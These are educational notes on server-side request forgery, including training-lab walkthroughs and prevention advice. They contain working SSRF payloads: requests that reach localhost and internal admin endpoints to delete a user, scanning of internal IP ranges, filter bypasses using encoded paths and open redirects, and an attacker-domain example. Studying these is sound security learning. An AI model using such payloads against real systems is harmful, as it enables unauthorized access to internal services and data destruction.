- It allows an attacker to cause the server-side application to make requests to an unintended location.

- A vulnerability that lets an attacker send requests on behalf of a server.

- A successful SSRF attack can often result in unauthorized actions or access to data in the vulnerable application or on other back-end systems that the application can communicate with.

- SSRF attacks can exploit open redirections, proxy services or simple URL vulnerabilities (POST body headers or *Referer* header).

### Types of SSRF:

- **Against the server itself**
- **Against other backend systems**
- **Blind SSRF**

## SSRF attacks against the server itself

The attacker causes the application to make an HTTP request back to the server that is hosting the application, via its loopback network interface. This typically involves supplying a URL with a hostname like `127.0.0.1` or `localhost`.

For example, imagine a shopping application that lets the user view whether an item is in stock in a particular store. To provide the stock information, the application must query various back-end REST APIs. It does this by passing the URL to the relevant back-end API endpoint via a front-end HTTP request. When a user views the stock status for an item, their browser makes the following request:

```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
```

This causes the server to make a request to the specified URL, retrieve the stock status, and return this to the user.

In this example, an attacker can modify the request to specify a URL local to the server:

```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://localhost/admin
```

The server fetches the contents of the `/admin` URL and returns it to the user, but the administrative functionality is normally only accessible to authenticated users. This means an attacker won't see anything of interest. However, if the request to the `/admin` URL comes from the local machine, the normal access controls are bypassed. The application grants full access to the administrative functionality, because the request appears to originate from a trusted location.

###### Lab: Basic SSRF against the local server

Intercept the `POST` request for checking the stock of a product:

```http
POST https://0a9600f904f43d3f844b91a500a20013.web-security-academy.net/product/stock HTTP/1.1
```

and edit the body from this:
```http
stockApi=http%3A%2F%2Fstock.weliketoshop.net%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
``` 

to this `stockApi=http://localhost/admin/delete?username=carlos`

## SSRF attacks against other back-end systems

In some cases, the application server is able to interact with back-end systems that are not directly reachable by users. In many cases, internal back-end systems contain sensitive functionality that can be accessed without authentication by anyone who is able to interact with the systems.

In the previous example, imagine there is an administrative interface at the back-end URL `https://192.168.0.68/admin`. An attacker can submit the following request to exploit the SSRF vulnerability, and access the administrative interface:

```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://192.168.0.68/admin
```

###### Lab: Basic SSRF against another back-end system

Intercept the `POST` request for checking the stock of a product:

```http
POST https://0ad700cb04b453db803c76ba000a00ac.web-security-academy.net/product/stock HTTP/1.1
```

and edit the body from this:
```http
stockApi=http%3A%2F%2F192.168.0.1%3A8080%2Fproduct%2Fstock%2Fcheck%3FproductId%3D1%26storeId%3D1
``` 

to this `stockApi=http://192.168.0.0:8080/admin`. Then fuzz on the IP address (last 256 digits) and take the IP address with the 200 OK response: send again the request with the body `stockApi=http://192.168.0.249:8080/admin/delete?username=carlos` to delete carlos user. 

## Circumventing common SSRF defenses

It is common to see applications containing SSRF behavior together with defenses aimed at preventing malicious exploitation. Often, these defenses can be circumvented.

### SSRF with blacklist-based input filters

Some applications block input containing hostnames like `127.0.0.1` and `localhost`, or sensitive URLs like `/admin`. In this situation, you can often circumvent the filter using the following techniques:

- Use an alternative IP representation of `127.0.0.1`, such as `2130706433`, `017700000001`, or `127.1`.
- Register your own domain name that resolves to `127.0.0.1`. You can use `spoofed.burpcollaborator.net` for this purpose.
- Obfuscate blocked strings using URL encoding or case variation.
- Provide a URL that you control, which redirects to the target URL. Try using different protocols for the target URL. For example, switching from an `http:` to `https:` URL during the redirect has been shown to bypass some anti-SSRF filters.

###### Lab: SSRF with blacklist-based input filter

Intercept the `POST` request for checking the stock of a product and edit the body:

```http
http://127.1/%2561dmin/delete?username=carlos
```

Practically, we have URL double encoded the 'a' character of admin and changed `localhost` to `127.1`.

### Bypassing SSRF filters via open redirection

It is sometimes possible to bypass filter-based defenses by exploiting an open redirection vulnerability.

In the previous example, imagine the user-submitted URL (`stockAPI`) is strictly validated to prevent malicious exploitation of the SSRF behavior. However, the application contains an open redirection vulnerability.

For example, the application contains an open redirection vulnerability in which the following URL:

`/product/nextProduct?currentProductId=6&path=http://evil-user.net`

returns a redirection to:

`http://evil-user.net`

You can leverage the open redirection vulnerability to bypass the URL filter, and exploit the SSRF vulnerability as follows:

```http
POST /product/stock HTTP/1.0 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 118 
stockApi=http://weliketoshop.net/product/nextProduct?currentProductId=6&path=http://192.168.0.68/admin
```

This SSRF exploit works because the application first validates that the supplied `stockAPI` URL is on an allowed domain, which it is. So the application sends a request to the `stockAPI` URL which then makes a redirection to `http://192.168.0.68/admin`.

###### Lab: SSRF with filter bypass via open redirection vulnerability

Notice that the "Next product" request has an open redirect:

```http
GET https://0a8e005504e77ce6806cd0e3002000ba.web-security-academy.net/product/nextProduct?currentProductId=2&path=/product?productId=3 HTTP/1.1
```

Now intercept the stock checker request and change the `stockApi` with `stockApi=/product/nextProduct?path=http://192.168.0.12:8080/admin/delete?username=carlos`. By doing so, the stock checker will call the nextProduct endpoint (with its open redirect) which will redirect to the admin page.

## Blind SSRF vulnerabilities

Blind SSRF vulnerabilities occur if you can cause an application to send a back-end HTTP request to a supplied URL, but the response from the back-end request is not returned in the application's front-end response.

Blind SSRF is harder to exploit but sometimes leads to full remote code execution (**RCE**) on the server or other back-end components.

## Prevention

- **Allow lists** (preferred): requests must contain URLs in the list, otherwise they are rejected. Be aware of regexes: they are often used improperly!
- **Disallow lists (or blocklists)**: requests must not contain URLs in the list, otherwise they are rejected. There's always the possibility to bypass the disallow list: if we have disallowed `localhost`, be aware of all its other representations and before checking the disallow list (validation), be sure that the input is in canonical form!
- Don’t allow external links and (if possible) open redirects!